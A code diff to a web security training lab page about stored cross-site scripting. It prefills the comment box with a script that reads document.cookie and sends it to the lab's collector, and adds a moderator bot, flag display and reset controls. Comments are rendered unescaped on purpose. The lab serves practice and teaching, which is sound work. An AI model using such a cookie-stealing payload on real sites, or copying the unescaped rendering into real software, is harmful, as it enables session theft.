@@ -12,13 +12,33 @@
 
   <div class="lab-card">
     <h1>Leave a comment</h1>
+    <p class="lab-meta">Comments are stored and rendered without escaping. The moderator bot reviews the page with your proof cookie.</p>
     <form method="POST" action="/labs/stored-xss">
       <label>Name</label>
-      <input name="author" placeholder="Your name">
+      <input name="author" placeholder="Your name" value="attacker">
       <label>Comment</label>
-      <textarea name="body" placeholder="Say something..."></textarea>
+      <textarea name="body" placeholder="Say something...">&lt;script&gt;fetch('/labs/stored-xss/collect?t='+encodeURIComponent(document.cookie))&lt;/script&gt;</textarea>
       <button type="submit">Post comment</button>
     </form>
+  </div>
+
+  <div class="lab-card">
+    <h2>Moderator review</h2>
+    <p>Trigger the isolated moderator bot. It loads the comment queue with the non-HttpOnly proof cookie and follows same-origin script requests.</p>
+    <form method="POST" action="/labs/stored-xss/bot">
+      <button type="submit">Send moderator bot</button>
+    </form>
+    <% if (botResult) { %>
+      <div class="lab-alert <%= botResult.captured ? 'success' : 'info' %>" style="margin-top:1rem;">
+        Bot finished. Proof captured: <strong><%= botResult.captured %></strong>
+        <% if (botResult.error) { %><br>Error: <%= botResult.error %><% } %>
+      </div>
+    <% } %>
+    <% if (flag) { %>
+      <div class="lab-alert success" style="margin-top:1rem;">Flag: <span class="lab-flag"><%= flag %></span></div>
+    <% } %>
+    <button type="button" class="secondary" id="checkStored" style="margin-top:0.8rem;">Check verification</button>
+    <pre class="lab-code" id="storedResult" style="margin-top:0.8rem;">Not checked yet.</pre>
   </div>
 
   <div class="lab-card">
@@ -35,5 +55,20 @@
     </ul>
   </div>
 
+  <form method="POST" action="/labs/stored-xss/reset"><button type="submit" class="secondary">Reset lab</button></form>
+</div>
+<script>
+  document.getElementById('checkStored').addEventListener('click', async function () {
+    const out = document.getElementById('storedResult');
+    try {
+      const response = await fetch('/labs/stored-xss/status');
+      const data = await response.json();
+      out.textContent = JSON.stringify(data, null, 2);
+      if (data.flag) out.textContent += '\n\nFLAG: ' + data.flag;
+    } catch (error) {
+      out.textContent = 'Status check failed: ' + error.message;
+    }
+  });
+</script>
 </body>
 </html>
